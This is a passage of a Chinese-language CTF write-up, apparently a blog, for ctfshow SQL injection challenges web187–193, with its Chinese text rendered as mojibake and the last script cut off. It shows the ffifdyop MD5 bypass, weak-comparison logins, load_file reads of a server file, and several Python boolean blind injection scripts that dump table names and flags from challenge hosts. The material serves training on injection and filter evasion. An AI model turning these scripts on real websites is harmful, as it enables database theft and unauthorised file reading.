punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><p><img src="web187.png" loading="lazy"></p><p><strong>ffifdyop||129581926211651571912466741651878684928</strong></p><p>ç»è¿‡md5åŠ å¯†åï¼š276f722736c95d99e921722cf9ed621c</p><p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼šâ€™orâ€™6&lt;ä¹±ç &gt; å³  <code>&#39;or&#39;66ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code></p><h4 id="web188-å¼±æ¯”è¾ƒ"><a href="#web188-å¼±æ¯”è¾ƒ" class="headerlink" title="web188(&#x3D;&#x3D;å¼±æ¯”è¾ƒ)"></a>web188(&#x3D;&#x3D;å¼±æ¯”è¾ƒ)</h4><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ç”¨æˆ·åæ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">=></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    </code></pre><p>payloadæ˜¯ï¼š<code>username=0 password=0</code></p><p>åœ¨æ¯”è¾ƒæŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>select pass from ctfshow_user where username = 0 and password = 0;</code>ï¼Œç”±äº<code>username password</code>æ˜¯å­—ç¬¦ä¸²ï¼Œå¼±æ¯”è¾ƒæˆäº†0,0&#x3D;0æˆç«‹ï¼Œæ‰€æ¡ä»¶å°±æˆç«‹äº†ï¼›æœ€åæŸ¥è¯¢è¯­å¥å°±æˆäº†ï¼š<code>select pass from ctfshow_user where 1;</code></p><p>[<img src="web188.png" loading="lazy"></p><h4 id="web189-locate-load-file"><a href="#web189-locate-load-file" class="headerlink" title="web189(locate load_file)"></a>web189(locate load_file)</h4><p><strong>Hint</strong>ï¼šflagåœ¨api&#x2F;index.phpæ–‡ä»¶ä¸­</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ç”¨æˆ·åæ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç æ£€æµ‹</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'å¯†ç åªèƒ½ä¸ºæ•°å­—'</span><span class="token punctuation">;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//å¯†ç åˆ¤æ–­</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   </code></pre><p>æ ¹æ®æç¤ºï¼Œå…ˆåˆ©ç”¨locateå®šä½flagçš„ä½ç½®ï¼Œç„¶åä½¿ç”¨ç›²æ³¨æ¥å¾—åˆ°flag</p><blockquote><p>LOCATE(å­—ç¬¦ä¸²1,å­—ç¬¦ä¸²2)</p><p>è¿”å›å­—ç¬¦ä¸²1åœ¨å­—ç¬¦ä¸²2ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œåªè¦å­—ç¬¦ä¸²2ä¸­åŒ…å«å­—ç¬¦ä¸²1ï¼Œé‚£ä¹ˆè¿”å›å€¼å¿…ç„¶å¤§äº0ã€‚</p></blockquote><blockquote><p>username&#x3D;0ã€password&#x3D;0æ—¶ï¼Œè¿”å›â€œå¯†ç é”™è¯¯â€ã€‚ï¼ˆè¯´æ˜å­˜åœ¨ç”¨æˆ·ï¼Œä½†æ˜¯å¯†ç é”™è¯¯ï¼‰<br>username&#x3D;1ã€password&#x3D;0æ—¶ï¼Œè¿”å›â€œæŸ¥è¯¢å¤±è´¥â€ã€‚ï¼ˆè¯´æ˜ç”¨æˆ·ä¸å­˜åœ¨ï¼‰</p></blockquote><p>å¯ä»¥åˆ©ç”¨ä»¥ä¸Šè¿”å›æƒ…å†µæ¥è¿›è¡Œifé€å­—ç¬¦ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://deb43701-a2f5-42bf-817a-f374b486bcdf.challenge.ctf.show/api/'</span><span class="token keyword">def</span> <span class="token function">getFlagIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">1</span>    tail <span class="token operator">=</span> <span class="token number">300</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(locate('ctfshow&#123;',"</span> <span class="token operator">+</span> <span class="token string">"load_file('/var/www/html/api/index.php'))>&#123;&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">return</span> mid<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        head <span class="token operator">=</span> <span class="token number">32</span>        tail <span class="token operator">=</span> <span class="token number">127</span>        <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"if(ascii(substr(load_file('/var/www/html/api/index.php'),&#123;0&#125;,1))>&#123;1&#125;,0,1)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>            <span class="token punctuation">&#125;</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                tail <span class="token operator">=</span> mid            <span class="token comment"># mid += 1</span>        <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    mid <span class="token operator">=</span> getFlagIndex<span class="token punctuation">(</span><span class="token punctuation">)</span>    getFlag<span class="token punctuation">(</span>mid<span class="token punctuation">)</span></code></pre><p>è¿˜æœ‰ä¸€ä¸ªæ²¡æœ‰é‡‡ç”¨äºŒåˆ†ç®—æ³•çš„</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://dc02940d-e22b-4796-ab0f-04bdf57d3a9f.challenge.ctf.show/api/"</span>flagstr <span class="token operator">=</span> <span class="token string">"&#125;&#123;&lt;>$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#è¿™ä¸ªä½ç½®ï¼Œæ˜¯ç¾¤ä¸»è€—è´¹å¾ˆé•¿æ—¶é—´è·‘å‡ºæ¥çš„ä½ç½®~</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">257</span><span class="token punctuation">,</span><span class="token number">257</span><span class="token operator">+</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"if(substr(load_file('/var/www/html/api/index.php'),&#123;&#125;,1)=('&#123;&#125;'),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span><span class="token comment"># 8d25æ˜¯username=1æ—¶çš„é¡µé¢è¿”å›å†…å®¹åŒ…å«çš„ï¼Œå…·ä½“å¯ä»¥çœ‹ä¸Šé¢çš„æˆªå›¾~</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"8d25"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>flag<span class="token operator">+=</span>x<span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h4 id="web190-å¸¸è§„bool-blind"><a href="#web190-å¸¸è§„bool-blind" class="headerlink" title="web190(å¸¸è§„bool blind)"></a>web190(å¸¸è§„bool blind)</h4><p>è¾“å…¥ admin&#x2F;123 è¾“å‡ºå¯†ç é”™è¯¯</p><p>è¾“å…¥ test&#x2F;123 è¾“å‡ºç”¨æˆ·åä¸å­˜åœ¨</p><p>è¯´æ˜å­˜åœ¨è´¦å· admin</p><hr><p>è¾“å…¥ adminâ€™ and 1&#x3D;1 # è¾“å‡ºå¯†ç é”™è¯¯</p><p>è¾“å…¥ adminâ€™ and 1&#x3D;2 # è¾“å‡ºç”¨æˆ·åä¸å­˜åœ¨</p><p>è¯´æ˜å­˜åœ¨å¸ƒå°”ç›²æ³¨çš„æ¡ä»¶</p><hr><p>pass é•¿åº¦ä¸º5 å€¼ä¸º admin</p><p>adminâ€™ and length(pass) &#x3D; 5 #</p><p>adminâ€™ and pass &#x3D; â€˜adminâ€™ #</p><p>è¯´æ˜ flag å¹¶ä¸æ˜¯ pass çš„å€¼</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ­£å¸¸çš„ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://55202cb2-6c46-4248-a593-31a004489e2a.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select f1ag from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin' and if(ascii(substr((&#123;0&#125;),&#123;1&#125;,1))>&#123;2&#125;,1,2)='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"å¯†ç é”™è¯¯"</span><span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web191-ord"><a href="#web191-ord" class="headerlink" title="web191(ord)"></a>web191(ord)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>banäº†asciiï¼Œå¯ä»¥ä½¿ç”¨ord</p><h4 id="web192-regexp"><a href="#web192-regexp" class="headerlink" title="web192(regexp)"></a>web192(regexp)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/file|into|ascii|ord|hex/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç”¨æˆ·åéæ³•'</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></code></pre><p><code>ord</code> <code>hex</code>éƒ½è¢«banäº†</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">'https://672395a7-518e-4be5-b990-8af1ef5202c4.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">" _&#123;&#125;-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥æ•°æ®åº“  ctfshow_fl0g,ctfshow_user</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥å­—æ®µ  id,f1ag</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select group_concat(f1ag) from ctfshow_fl0g"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">'),1,2)='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token number">1</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"å¯†ç é”™è¯¯"</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h4 id="web193-left-right"><a href="#web193-left-right" class="headerlink" title="web193(left right)"></a>web193(left right)</h4><p>è¿‡æ»¤äº†<code>file|into|ascii|ord|hex|substr</code>ï¼Œsubstræ²¡äº†ï¼Œå¯ä»¥ç”¨<code>left() right()</code>ï¼Œå…¶å®ä¹Ÿå¯ä»¥ç”¨<code>mid()</code>ï¼Œè¿™é‡Œå°†æ•°æ®åº“åå­—ç»™æ”¹äº†ï¼Œå’Œ192çš„ä¸ä¸€æ ·ï¼Œéœ€è¦é‡æ–°æ„é€ ä¸€ä¸ªç”¨æ¥æŸ¥è¯¢çš„è¯­å¥ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://df755a50-9318-495a-9788-1c5c721b44e2.challenge.ctf.show:8080/api/"</span>flagstr<span class="token operator">=</span><span class="token string">"abcdefghijklmnopqrstuvwxyz1234567890_&#123;-&#125; ,"</span>flag<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        change<span class="token operator">=</span>flag<span class="token operator">+</span>j        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(left((select group_concat(f1ag)from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>change<span class="token punctuation">&#125;</span></span><span class="token string">'),1,0)=1#"</span></span>        <span class="token comment">#payload = f"admin' and if((select group_concat(f1ag)from ctfshow_flxg)regexp('&#123;change&#125;'),1,0)=1#"</span>        <span class="token comment">#ç¬¬äºŒä¸ªpayloadæ²¡æœ‰ä½¿ç”¨æˆªæ–­å­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç›´æ¥ä½¿ç”¨regexpè¿›è¡Œçš„åŒ¹é…</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"å¯†ç é”™è¯¯"</span> <span class="token operator">==</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p>å¯ä»¥å°†payloadçš„leftç»™å»æ‰ï¼Œç›´æ¥æ­£åˆ™åŒ¹é…ï¼Œä¸è¿‡éœ€è¦èµ·ä¸€ä¸ªâ€™ctfshow{â€˜çš„å¤´å°±è¡Œå°±è¡Œã€‚Y4å¤§ä½¬çš„åšæ³•æ˜¯ï¼Œå°†<code>&#123;</code>æ”¾åˆ°äº†<code>flagstr</code>çš„å‰è¾¹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token 